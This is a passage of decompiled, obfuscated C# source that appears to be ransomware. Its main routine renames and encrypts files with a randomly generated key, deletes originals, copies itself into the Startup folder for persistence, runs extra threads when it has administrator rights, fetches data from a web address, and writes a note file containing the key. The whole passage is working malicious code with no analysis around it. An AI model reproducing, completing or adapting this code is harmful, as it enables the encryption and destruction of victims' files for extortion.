						if (loDvPGrZMBwOJMj == getString_0(107396878) && new FileInfo(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx).Length > Convert.ToInt32(ThqgRSrzuFx) * 1024 * 1024)
						{
							try
							{
								if (uYKcRkbjPyG != getString_0(107386882))
								{
									if (FjsJwHpFzPmVq)
									{
										uYKcRkbjPyG = WxVPvEgBcYyDLSq + uYKcRkbjPyG;
									}
									File.Move(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + uYKcRkbjPyG);
								}
							}
							catch (Exception ex6)
							{
								if (eCrtUqxUXqEDfkG)
								{
									try
									{
										File.AppendAllText(ZOToawIMfprr, getString_0(107386617) + CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + getString_0(107403799) + ex6.Message + getString_0(107396281));
									}
									catch (Exception)
									{
									}
								}
								cMPsaAWwrrbpa++;
								return;
							}
							if (uYKcRkbjPyG != getString_0(107386882))
							{
								CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx += uYKcRkbjPyG;
							}
							if (grVWpVNxmvUXt == getString_0(107396878))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in YXlceGYDfnj)
									{
										if (CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.IkKoTnSnjIE.uYKcRkbjPyG) && BMlICsewZHNNqOZxm == zHykNUMLBYF.getString_0(107396884))
										{
											if (Convert.ToInt32(RVYOolFtuFdobqh) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx).Length)
											{
												try
												{
													wdiXDjuJgNGJ.DCRZpKamZEizX(zHykNUMLBYF.getString_0(107390215), zHykNUMLBYF.getString_0(107390210), zHykNUMLBYF.getString_0(107390165), CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().EndsWith(item) && BMlICsewZHNNqOZxm == zHykNUMLBYF.getString_0(107397044))
										{
											try
											{
												wdiXDjuJgNGJ.DCRZpKamZEizX(zHykNUMLBYF.getString_0(107390215), zHykNUMLBYF.getString_0(107390210), zHykNUMLBYF.getString_0(107390165), CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = VEEBlwVfMrF.psRYhOyItCIDHrZ(32);
							string s = gXnOfppahrNWi.sBDlGorhadqnmxr(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (dtBtLrowijPwW == getString_0(107397038))
							{
								byte[] array2 = null;
								byte[] byte_ = wZhxBLOUELLD.YyvEaXvrgGWE(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, Convert.ToInt32(ThqgRSrzuFx) * 1024 * 1024);
								if (!wZhxBLOUELLD.kFTEsbJnnwQZ(ZuPICqOHsAezK: (!JQllwusRFZbJU) ? (sFwpaHIPJDNK ? wZhxBLOUELLD.TWWzYeNNrdZT(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : wZhxBLOUELLD.TWWzYeNNrdZT(byte_, Encoding.ASCII.GetBytes(rlUOZBzOokWP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (sFwpaHIPJDNK ? eihvGbfwnIee.kXimjkJppApPOW(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : eihvGbfwnIee.kXimjkJppApPOW(byte_, Encoding.ASCII.GetBytes(rlUOZBzOokWP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), lMQywbZRpEOBbR: CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, iPDawhgBDCF: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + uYKcRkbjPyG, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!sFwpaHIPJDNK)
							{
								if (!eQDWwInDCVt.MzXnLHyJOA(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, ThqgRSrzuFx, rlUOZBzOokWP))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + uYKcRkbjPyG, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!eQDWwInDCVt.MzXnLHyJOA(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, ThqgRSrzuFx, text, bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + uYKcRkbjPyG, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (FjsJwHpFzPmVq)
							{
								uYKcRkbjPyG = WxVPvEgBcYyDLSq + uYKcRkbjPyG;
							}
							string text2 = VEEBlwVfMrF.psRYhOyItCIDHrZ(32);
							string s2 = gXnOfppahrNWi.sBDlGorhadqnmxr(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (uYKcRkbjPyG != getString_0(107386882))
							{
								if (!lLDISlXAEBoGjsf)
								{
									if (!sFwpaHIPJDNK)
									{
										nIyfuHCZss(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + uYKcRkbjPyG, FlUpRKIMpc);
									}
									else
									{
										nIyfuHCZss(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + uYKcRkbjPyG, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!sFwpaHIPJDNK)
										{
											nOFFyaCnYAwSb(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + uYKcRkbjPyG, FlUpRKIMpc);
										}
										else
										{
											nOFFyaCnYAwSb(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + uYKcRkbjPyG, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex11)
									{
										if (eCrtUqxUXqEDfkG)
										{
											try
											{
												File.AppendAllText(ZOToawIMfprr, getString_0(107386617) + CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + getString_0(107386836) + ex11.Message + getString_0(107396281));
											}
											catch (Exception)
											{
											}
										}
										cMPsaAWwrrbpa++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + uYKcRkbjPyG, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!lLDISlXAEBoGjsf)
							{
								if (!sFwpaHIPJDNK)
								{
									nIyfuHCZss(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + getString_0(107386877), FlUpRKIMpc);
								}
								else
								{
									nIyfuHCZss(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + getString_0(107386877), Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!sFwpaHIPJDNK)
									{
										nOFFyaCnYAwSb(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, FlUpRKIMpc);
									}
									else
									{
										nOFFyaCnYAwSb(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex14)
								{
									if (eCrtUqxUXqEDfkG)
									{
										try
										{
											File.AppendAllText(ZOToawIMfprr, getString_0(107386617) + CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + getString_0(107386836) + ex14.Message + getString_0(107396281));
										}
										catch (Exception)
										{
										}
									}
									cMPsaAWwrrbpa++;
									return;
								}
							}
							if (sFwpaHIPJDNK)
							{
								if (uYKcRkbjPyG != getString_0(107386882))
								{
									dnVJbaOwGkkjKGJ(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + uYKcRkbjPyG, bytes2);
								}
								else
								{
									dnVJbaOwGkkjKGJ(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, bytes2);
								}
							}
						}
						end_IL_085c_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1000;
			IL_1000:
			wNdNDiAzKQBqV.Remove(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
		}

		static xtcPtppfARaJuWs()
		{
			Strings.CreateGetStringDelegate(typeof(xtcPtppfARaJuWs));
		}
	}

	private sealed class SNppjQiTBFc
	{
		public string VzCpOSPDVzMkY;

		public string iHCToHaiMkWdn;

		public void _003CEncrypt2_003Eb__49()
		{
			while (true)
			{
				try
				{
					File.Delete(VzCpOSPDVzMkY);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__4a()
		{
			while (true)
			{
				try
				{
					if (File.Exists(iHCToHaiMkWdn))
					{
						File.Delete(iHCToHaiMkWdn);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string OYgLNIskArR;

	public static byte[] FlUpRKIMpc;

	public static string WdmZVvJAGkn;

	public static string jAynPWDbXCIKzXxz;

	public static List<string> bxAnSckylQQtw;

	public static List<string> PjENmtbonz;

	public static string HeLXKFdXBNIf;

	public static string rlUOZBzOokWP;

	public static string WxMkiEDbIXuahVVZ;

	public static string ZSkAQXWbdKhNt;

	public static int fKCbuKnljaeeL;

	public static string JuoxaLNRiTYHeY;

	public static string zWQclkFVjAoj;

	public static string wOjlPEyvjSgGoIM;

	public static string JaFQxijoGjyqp;

	public static string jIBleNxFgGnWID;

	public static string dhBbWMIjTwffU;

	public static string eHkWrMUTVmXe;

	public static string ABReLBCMjuneq;

	public static List<string> ibDWBhFHXM;

	public static List<string> mRCgNmhiRqq;

	public static string qzOowmHZfkhdez;

	public static string NuodKPdNfEzur;

	public static string mTfTIphgIo;

	public static List<string> gHJtQxzOYMxb;

	public static string dtnCJsApLCAXi;

	private static string oNsTRLvDWmMpsf;

	public static string paHHgwLQtjlpi;

	public static string sSmfWYSSvGpE;

	public static List<string> VNggxvjEdkKwis;

	public static List<string> oZUWRutzOXWA;

	public static List<string> swPjvwMqhDoflU;

	public static List<string> TKVaNAxtSvsgMn;

	public static string NCHqCgWFctjH;

	public static List<string> CVIVuAHJiUyCCD;

	public static List<string> rcTQhUOkgot;

	public static string ojvMAdIeSwE;

	public static string vRURJEOOIaHkG;

	internal static DateTime brffVNyvowN;

	internal static DateTime zlMBORpRtzaB;

	public static string loDvPGrZMBwOJMj;

	public static string ThqgRSrzuFx;

	public static string FkGLrqIUpzxDHVt;

	public static string hAQaujZRdIn;

	public static string ozGZDFIdpsO;

	public static string ZsAvxBrCoSu;

	public static string VMndBHsYIQbc;

	public static string grVWpVNxmvUXt;

	public static List<string> YXlceGYDfnj;

	public static string BMlICsewZHNNqOZxm;

	public static string RVYOolFtuFdobqh;

	public static string cksQNLvacwcfK;

	public static string YzRuiFIlBCdqK;

	public static string KgUCnguAmVO;

	public static string hVHAamgGKApycpVZ;

	public static string AkREHqwaWIpI;

	public static string eoLcmZbUyT;

	public static string zMxsYkQZTHOZg;

	public static string wrewuxbxUhFHvm;

	public static string dQwHEwZancIGi;

	public static string MBUJmoNzdvqjc;

	public static string aCoCNqBZkVPpAo;

	public static string dLlZlbHnZKXOUVzbI;

	public static string YLbujxZhsifzLe;

	public static string WcOrCuqMUu;

	public static string dmnGDBbKbJHB;

	public static string fzsCEaRTyYLR;

	public static string pjpQyhsoHmee;

	public static string AlXvbFdlnNXOi;

	public static string raHBJYQabcE;

	public static string TtwbSrOFWZWsvu;

	public static string SyYKiPdzQWvgTS;

	public static string mOZlcUdlpNwiQK;

	public static string zXyRyXbnGmnuzR;

	public static string SoEZhDoCKKScgM;

	public static string dtBtLrowijPwW;

	public static string ZXeTIcPkIrgR;

	public static string ObnKcCkHcytzR;

	public static string[] nAfCNlgUUqDMMcw;

	public static string ucHAaUvpilVt;

	public static bool JQllwusRFZbJU;

	public static string PoMiZLuhKNIJ;

	public static bool sFwpaHIPJDNK;

	public static bool NInXLtDmFUW;

	public static bool hJrFgrNDDLlP;

	public static bool dsaIGmLDhFHi;

	public static string ZOToawIMfprr;

	public static bool eCrtUqxUXqEDfkG;

	public static bool EPVltlFvMVd;

	public static bool iwixckvIrQF;

	public static bool MJkKDioyTKQW;

	public static bool lLDISlXAEBoGjsf;

	public static string fnEjkTZXUzKS;

	public static bool rjVAnmtTRGwdsGoP;

	public static Stopwatch typGKIfMDBboZkK;

	public static int cMPsaAWwrrbpa;

	public static int ureUqQkXCPeI;

	public static bool FjsJwHpFzPmVq;

	public static string WxVPvEgBcYyDLSq;

	public static string[] ODPKklRsLbvQ;

	public static List<string> VctgEKcOffY;

	public static int IZRjbACZbN;

	public static List<string> xvGpfMLcVJUVWi;

	public static List<string> HIVPLYuaNOel;

	public static List<string> jVSHoAYQGCtaqP;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate18;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1f;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			TfFaQoqMPbFXcuw CS_0024_003C_003E8__locals0 = new TfFaQoqMPbFXcuw();
			CS_0024_003C_003E8__locals0.JTGRBnDiuXphC = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.JTGRBnDiuXphC) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			LGGBdZAAidSVoM.CaeCREdOuSqSgt(oNsTRLvDWmMpsf);
		}
		catch (Exception)
		{
		}
		try
		{
			if (SoEZhDoCKKScgM == getString_0(107396857))
			{
				Thread thread = new Thread(toLtSgGApPp.QaSRYPxwjQF);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (wOjlPEyvjSgGoIM == getString_0(107396857))
		{
			Thread.Sleep(int.Parse(JaFQxijoGjyqp));
		}
		if (cksQNLvacwcfK == getString_0(107396857))
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					iNttnIpBMwz CS_0024_003C_003E8__locals1 = new iNttnIpBMwz();
					CS_0024_003C_003E8__locals1.BNqEbRJtAzN = new string[4]
					{
						HnrHiFTDAEzVb(getString_0(107396852)),
						HnrHiFTDAEzVb(getString_0(107396867)),
						HnrHiFTDAEzVb(getString_0(107396818)),
						HnrHiFTDAEzVb(getString_0(107396789))
					};
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						sZZiKvvuSOPcQ.oetkkjIFJK(CS_0024_003C_003E8__locals1.BNqEbRJtAzN);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				qZnzHBKuTVcFOTuDl.MzDVUbsVUlxaYpSY(HnrHiFTDAEzVb(getString_0(107396867)));
			}
			catch
			{
			}
			try
			{
				qZnzHBKuTVcFOTuDl.MzDVUbsVUlxaYpSY(HnrHiFTDAEzVb(getString_0(107396789)));
			}
			catch
			{
			}
			try
			{
				qZnzHBKuTVcFOTuDl.MzDVUbsVUlxaYpSY(HnrHiFTDAEzVb(getString_0(107396804)));
			}
			catch
			{
			}
			try
			{
				qZnzHBKuTVcFOTuDl.MzDVUbsVUlxaYpSY(HnrHiFTDAEzVb(getString_0(107396818)));
			}
			catch
			{
			}
			Thread thread3 = new Thread(sZZiKvvuSOPcQ.YGolGtVNyThd);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && VMndBHsYIQbc == getString_0(107396857))
		{
			try
			{
				xINXPJyncFYvj(HnrHiFTDAEzVb(getString_0(107396755)));
			}
			catch
			{
			}
		}
		try
		{
			if (eHkWrMUTVmXe == getString_0(107396857) && ZKCsIWEwayC.nqvOwpNBbQzNa())
			{
				new CDCQwbhpmJ().qqPUkrMUmwPNT(bool_0: false);
				ZKCsIWEwayC.aGPhpPYzkUez();
			}
		}
		catch (Exception)
		{
		}
		if (NuodKPdNfEzur == getString_0(107396857) && ZKCsIWEwayC.nqvOwpNBbQzNa())
		{
			new CDCQwbhpmJ().qqPUkrMUmwPNT(bool_0: false);
			new CDCQwbhpmJ().LvYqbmKZjasTc();
		}
		if (zWQclkFVjAoj == getString_0(107396857))
		{
			pXVSwGRaIGsEQhi.rHlToTJtTTEJ();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397194);
			string text2 = text + Path.GetFileName(fileName);
			if (ZSkAQXWbdKhNt == getString_0(107396857) && fileName != text2)
			{
				Thread thread4 = new Thread(VKyPOTiwyovAK);
				thread4.IsBackground = true;
				thread4.Priority = ThreadPriority.Normal;
				thread4.Start();
			}
			if (HeLXKFdXBNIf == getString_0(107396857) && mainModule != null && fileName != text2)
			{
				try
				{
					fKCbuKnljaeeL = NWNHCyLoun(0, ibDWBhFHXM.Count);
					File.Copy(fileName, text + ibDWBhFHXM[fKCbuKnljaeeL], overwrite: true);
					Process.Start(text + ibDWBhFHXM[fKCbuKnljaeeL]);
					kgxecZsMbpHn();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (ojvMAdIeSwE == getString_0(107396857) && DateTime.Now < brffVNyvowN)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (vRURJEOOIaHkG == getString_0(107396857) && DateTime.Now > zlMBORpRtzaB)
			{
				kgxecZsMbpHn();
			}
		}
		catch
		{
		}
		rrBseFoHixHDZ();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate
			{
				List<string> source = oZUWRutzOXWA;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
					{
						iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107386794)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				List<string> source2 = swPjvwMqhDoflU;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107386749)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				if (ObnKcCkHcytzR == getString_0(107396857))
				{
					string[] source3 = nAfCNlgUUqDMMcw;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
						{
							iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107386749)), getString_0(107386756) + string_0 + getString_0(107386203));
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				}
				if (!swuZnlPkVSzF().Contains(getString_0(107386942)))
				{
					ppBucnmnAMy(NCHqCgWFctjH);
				}
				else
				{
					List<string> tKVaNAxtSvsgMn = TKVaNAxtSvsgMn;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
						{
							iDwobxXLVYBDUs(HnrHiFTDAEzVb(zwAdSSSqsokmWfX(getString_0(107386198))), string_0);
						};
					}
					Parallel.ForEach(tKVaNAxtSvsgMn, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
				}
				List<string> cVIVuAHJiUyCCD = CVIVuAHJiUyCCD;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 = delegate(string string_0)
					{
						iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107386173)), string_0);
					};
				}
				Parallel.ForEach(cVIVuAHJiUyCCD, CS_0024_003C_003E9__CachedAnonymousMethodDelegate18);
			};
		}
		Thread thread5 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		thread5.Priority = ThreadPriority.Normal;
		thread5.IsBackground = true;
		thread5.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397189))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397189)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397140)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !bxAnSckylQQtw.Contains(text6) && text6 != getString_0(107397119) && text6 != getString_0(107397130) && text6 != getString_0(107397077))
								{
									bxAnSckylQQtw.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397048)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397067))
						{
							aCoCNqBZkVPpAo = getString_0(107396857);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397058))
						{
							aCoCNqBZkVPpAo = getString_0(107397017);
						}
					}
					if (text3.Contains(getString_0(107397012)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397067))
						{
							rjVAnmtTRGwdsGoP = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397058))
						{
							rjVAnmtTRGwdsGoP = false;
						}
					}
					if (text3.Contains(getString_0(107397027)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397067))
						{
							eCrtUqxUXqEDfkG = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397058))
						{
							eCrtUqxUXqEDfkG = false;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (eCrtUqxUXqEDfkG)
			{
				try
				{
					File.AppendAllText(ZOToawIMfprr, getString_0(107396982) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (aCoCNqBZkVPpAo == getString_0(107397017))
		{
			HfrIRSWYXajhN();
		}
		if (aCoCNqBZkVPpAo == getString_0(107396857))
		{
			try
			{
				DYlmoBqDrgnbL();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && hJrFgrNDDLlP)
			{
				try
				{
					Thread thread6 = new Thread(GpMDpSnRTzJaFT.PhOhDruvDTBe);
					thread6.IsBackground = true;
					thread6.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			iDwobxXLVYBDUs(getString_0(107396457), HnrHiFTDAEzVb(getString_0(107396412)));
		}
		if (qzOowmHZfkhdez == getString_0(107396857) && fTYEGqULfgfdMg() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread7 = new Thread(NSmpMkfnjXaqzv.QsBuVxHMqOHh);
			thread7.IsBackground = true;
			thread7.Priority = ThreadPriority.Normal;
			thread7.Start();
		}
		_ = sSmfWYSSvGpE == getString_0(107396857);
		SecureString secureString = new SecureString();
		if (FkGLrqIUpzxDHVt == getString_0(107397017))
		{
			Random random = new Random();
			for (int k = 0; k < 32; k++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					k--;
				}
			}
		}
		else
		{
			rlUOZBzOokWP = getString_0(107396339);
		}
		WxMkiEDbIXuahVVZ = gXnOfppahrNWi.sBDlGorhadqnmxr(GfSBVIpDWPq(secureString));
		if (eoLcmZbUyT == getString_0(107396857))
		{
			kwbymEbYECJfMFKO();
		}
		if (iwixckvIrQF)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), fnEjkTZXUzKS)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), fnEjkTZXUzKS), string.Concat(HnrHiFTDAEzVb(getString_0(107396326)), new WebClient().DownloadString(HnrHiFTDAEzVb(getString_0(107396301))), getString_0(107396260), HnrHiFTDAEzVb(getString_0(107396223)), DateTime.Now, getString_0(107396260), HnrHiFTDAEzVb(getString_0(107396694)), WxMkiEDbIXuahVVZ));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), fnEjkTZXUzKS), getString_0(107396637) + WxMkiEDbIXuahVVZ);
				}
			}
			catch (Exception ex9)
			{
				if (eCrtUqxUXqEDfkG)
				{
					try
					{
						File.AppendAllText(ZOToawIMfprr, getString_0(107396608) + ex9.Message + getString_0(107396260));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		zyotIScLtRpcl.qhFKbIEABtm(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), AlXvbFdlnNXOi), KisRUlBWicMvke(WxMkiEDbIXuahVVZ), null, null, getString_0(107396591), getString_0(107396542), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			QPvfAXYIDtzW();
		}
		try
		{
			try
			{
				if (rjVAnmtTRGwdsGoP)
				{
					Console.WriteLine(getString_0(107396557));
				}
			}
			catch
			{
			}
			eemtrgzEBOUiyZzv(new string[1] { getString_0(107396476) }, new string[100]
			{
				getString_0(107396467),
				getString_0(107396494),
				getString_0(107396489),
				getString_0(107395936),
				getString_0(107395931),
				getString_0(107395926),
				getString_0(107395921),
				getString_0(107395948),
				getString_0(107395943),
				getString_0(107395938),
				getString_0(107395901),
				getString_0(107395896),
				getString_0(107395919),
				getString_0(107395914),
				getString_0(107395905),
				getString_0(107395868),
				getString_0(107395863),
				getString_0(107395858),
				getString_0(107395885),
				getString_0(107395880),
				getString_0(107395839),
				getString_0(107395834),
				getString_0(107395829),
				getString_0(107395856),
				getString_0(107395851),
				getString_0(107395846),
				getString_0(107395841),
				getString_0(107395804),
				getString_0(107395799),
				getString_0(107395794),
				getString_0(107395821),
				getString_0(107395816),
				getString_0(107395811),
				getString_0(107395774),
				getString_0(107395765),
				getString_0(107395792),
				getString_0(107395787),
				getString_0(107395782),
				getString_0(107395921),
				getString_0(107395777),
				getString_0(107395943),
				getString_0(107395736),
				getString_0(107395731),
				getString_0(107395758),
				getString_0(107395753),
				getString_0(107395748),
				getString_0(107395711),
				getString_0(107395706),
				getString_0(107395701),
				getString_0(107395728),
				getString_0(107395723),
				getString_0(107395718),
				getString_0(107395713),
				getString_0(107396188),
				getString_0(107396183),
				getString_0(107396178),
				getString_0(107396205),
				getString_0(107396200),
				getString_0(107396159),
				getString_0(107396154),
				getString_0(107396145),
				getString_0(107396164),
				getString_0(107395777),
				getString_0(107396119),
				getString_0(107396142),
				getString_0(107396133),
				getString_0(107396092),
				getString_0(107396083),
				getString_0(107396106),
				getString_0(107396101),
				getString_0(107396060),
				getString_0(107396051),
				getString_0(107396074),
				getString_0(107396069),
				getString_0(107396032),
				getString_0(107396027),
				getString_0(107396022),
				getString_0(107396017),
				getString_0(107396044),
				getString_0(107396035),
				getString_0(107395998),
				getString_0(107395993),
				getString_0(107395988),
				getString_0(107396015),
				getString_0(107396010),
				getString_0(107396001),
				getString_0(107395960),
				getString_0(107395955),
				getString_0(107395811),
				getString_0(107395982),
				getString_0(107395977),
				getString_0(107395972),
				getString_0(107395423),
				getString_0(107395418),
				getString_0(107395409),
				getString_0(107395436),
				getString_0(107395431),
				getString_0(107395390),
				getString_0(107395385),
				getString_0(107395380)
			}, new string[0], GfSBVIpDWPq(secureString), getString_0(107395407));
		}
